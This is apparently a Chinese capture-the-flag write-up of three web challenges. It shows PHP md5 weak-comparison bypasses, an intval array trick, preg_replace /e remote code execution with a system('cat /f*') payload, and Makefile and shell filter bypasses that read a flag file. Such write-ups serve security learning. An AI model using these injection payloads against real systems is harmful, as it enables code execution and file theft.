# WEB

## warm up

### 第一关

根据源码可大致分为三次绕过

**1**

```php
if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {
    echo "ez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}
```

让传入的val1和val2的md5值相等,由于是==弱比较绕过,所以可以用md5后0e开头的字符串进行绕过

```
?val2=240610708&val1=QNKCDZO
```

**2**

```php
if (isset($md5) && $md5 == md5($md5)) {
    echo "ezez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}
```

去网上可以找到有些字符串,是0e开头并且md5后还是0e开头的

比如:0e215962017所以

此时构造成

```
?val2=240610708&val1=QNKCDZO&md5=0e215962017
```

**3**

```php
if ($XY == $XYCTF) {
  if ($XY != "XYCTF_550102591" && md5($XY) == md5("XYCTF_550102591")) {
    echo $level2;
  } else {
    die("什么情况,这么基础的md5做不来");
  }
} else {
  die("学这么久,传参不会传?");
}
```

首先XYCTF是有初值的所以想要过这个判断需要重新赋值给XYCTF,但是又要等于XYCTF_550102591的md5值又不能等于XYCTF_550102591让人看了很难办但是当我们把XYCTF_550102591去md5编码之后发现是

```
0e937920457786991080577371025051
```

所以此处也可以利用md5弱类型比较,最终payload

```
?val2=240610708&val1=QNKCDZO&md5=0e215962017&XY=s878926199a&XYCTF=s878926199a
```

绕过三步之后根据LLeeevvveeelll222.php进入第二关

### 第二关

**1**

```php
if (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {
    echo "操作你O.o";
```

POST传参a不能为数字,但是intval()函数又只能是数字,此时可以利用数组绕过

a[]=1,可以绕过正则匹配

**2**

```php
echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);  // 我可不会像别人一样设置10来个level
} else {
    die("有点汗流浃背");
}
```

由于preg_replace()函数存在命令执行漏洞利用preg_replace函数的一个“/e”模式

所以最终payload

```
?a=/123/e&b=system('cat /f*')&c=123
POST:a[]=1
```

# Makefile

## 解法一:

通过dirsearch去扫描网站发现存在/flag,访问就可得到flag

## 解法二:

输入1发现显示

```
No such file or directory
```

输入flag显示

```
Permission denied
```

表示权限不够

而

```
$(shell cat flag)
```

是makefile常用的命令格式,尝试之后

得到flag

# ez?Make



照常测试输入1返回

```
command not found
```

可以判断出此处是要执行命令,可以先尝试利用bp去爆破可利用字符,以便等会查找哪些命令无法使用

发现只有f l a g这四个字符被过滤,但是这四个字符却把很多常用执行文件读取的命令给禁用了

经查找uniq命令映入我们眼帘

猜测flag应该是在根目录

利用cd ..&&pwd判断目录可被穿越

于是构造payload

```
cd ..&&cd ..&&cd ..&&uniq [^0-9][^0-9][^b-z][^0-9]
```

此处猜测flag为flag不带后缀于是利用正则表达式快速方法是第三位正则匹配^b-z就行,当然如果没读出来也可以多搞几个精确,猜测文件名有几位正则匹配几次

于是拿到flag

